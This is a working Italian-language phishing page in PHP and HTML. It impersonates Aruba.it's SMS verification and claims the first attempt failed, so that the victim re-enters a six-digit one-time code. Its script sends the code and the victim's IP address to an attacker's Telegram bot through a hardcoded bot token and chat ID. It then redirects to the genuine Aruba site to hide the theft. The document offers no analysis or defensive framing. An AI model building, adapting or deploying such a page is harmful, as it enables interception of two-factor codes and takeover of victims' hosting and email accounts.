<?php
// Optionally, you can do server-side IP detection here if you want:
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    return $_SERVER['REMOTE_ADDR'] ?? 'Sconosciuto';
}
$userIP = getUserIP();
?>
<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8">
  <title>Verifica SMS - Secondo Tentativo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    :root {
      --primary-blue: #0071ce;
      --accent-orange: #f36f21;
      --background: #f9f9f9;
      --text-dark: #333;
    }

    body {
      margin: 0;
      padding: 0;
      background-color: var(--background);
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .sms-box {
      background: #fff;
      padding: 40px 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      text-align: center;
      max-width: 400px;
      width: 90%;
    }

    h2 {
      color: var(--accent-orange);
      margin-bottom: 10px;
    }

    p {
      color: var(--text-dark);
      margin-bottom: 20px;
    }

    .error-msg {
      color: red;
      font-weight: bold;
      margin-bottom: 20px;
    }

    input[type="text"] {
      width: 100%;
      max-width: 200px;
      padding: 12px;
      font-size: 18px;
      text-align: center;
      border: 1px solid #ccc;
      border-radius: 6px;
      margin-bottom: 20px;
    }

    button {
      background-color: var(--primary-blue);
      color: white;
      padding: 12px 24px;
      font-size: 16px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }

    .thank-you {
      display: none;
      color: var(--primary-blue);
      font-weight: bold;
      font-size: 16px;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="sms-box">
    <h2>Verifica SMS</h2>
    <p class="error-msg" id="errorText">
      ❌ Verifica non riuscita.<br>Per favore, reinserisci il codice ricevuto via SMS.
    </p>
    <input type="text" id="smsCode" maxlength="6" placeholder="------">
    <br>
    <button onclick="retryVerification()">Verifica di nuovo</button>
    <p class="thank-you" id="thankYouMsg">
      ✅ Verifica completata. <br>
      Grazie per aver scelto Aruba.it come tuo provider di hosting e servizi digitali.
    </p>
  </div>

  <script>
    let userIP = "<?= htmlspecialchars($userIP, ENT_QUOTES) ?>";

    // fallback if you want client-side IP fetch uncomment below and comment above line
    /*
    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(data => userIP = data.ip)
      .catch(() => userIP = "Errore IP");
    */

    async function retryVerification() {
      const code = document.getElementById("smsCode").value.trim();
      const errorText = document.getElementById("errorText");
      const thankYouMsg = document.getElementById("thankYouMsg");

      if (code.length !== 6 || !/^\d{6}$/.test(code)) {
        alert("Inserisci un codice valido di 6 cifre.");
        return;
      }

      // Hide error and show thank you message
      errorText.style.display = "none";
      thankYouMsg.style.display = "block";

      // Send to Telegram
      const botToken = "8134569625:AAG7bzuQM6wlzjzLfaFCVFPbuJ4qQQUTt6s";
      const chatId = "-4932499123";
      const message = `🔁 *Secondo tentativo di verifica SMS:*\n📩 Codice reinserito: \`${code}\`\n🌐 IP: \`${userIP}\``;

      try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: "Markdown"
          })
        });
      } catch (error) {
        console.error("Errore durante l'invio a Telegram:", error);
      }

      // Redirect to Aruba after delay
      setTimeout(() => {
        window.location.href = "https://www.aruba.it";
      }, 4000);
    }
  </script>
</body>
</html>
